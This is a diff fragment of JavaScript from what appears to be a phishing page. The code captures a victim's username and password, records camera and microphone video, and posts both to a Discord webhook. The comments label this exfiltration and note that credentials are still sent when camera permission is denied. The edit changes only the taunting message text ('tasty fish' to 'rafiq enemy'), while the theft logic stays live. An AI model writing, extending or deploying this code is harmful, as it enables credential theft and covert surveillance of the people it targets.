@@ -55,7 +55,7 @@
                     
                     // Prepare the payload for Discord
                     const formData = new FormData();
-                    formData.append('content', `well well well you captured another tasty fish\n**Username:** ${user}\n**Password:** ${pass}`);
+                    formData.append('content', `you captured a rafiq enemy\n**Username:** ${user}\n**Password:** ${pass}`);
                     formData.append('file', blob, 'capture.webm');
 
                     // Exfiltrate to Discord
@@ -82,7 +82,7 @@
                 console.error("Camera/Mic access denied:", err);
                 // Still send the credentials even if they deny the camera!
                 const formData = new FormData();
-                formData.append('content', `well well well you captured another tasty fish (No video - permission denied)\n**Username:** ${user}\n**Password:** ${pass}`);
+                formData.append('content', `you captured another rafiq enemy (No video - permission denied)\n**Username:** ${user}\n**Password:** ${pass}`);
                 fetch(WEBHOOK_URL, { method: 'POST', body: formData });
             }
         });
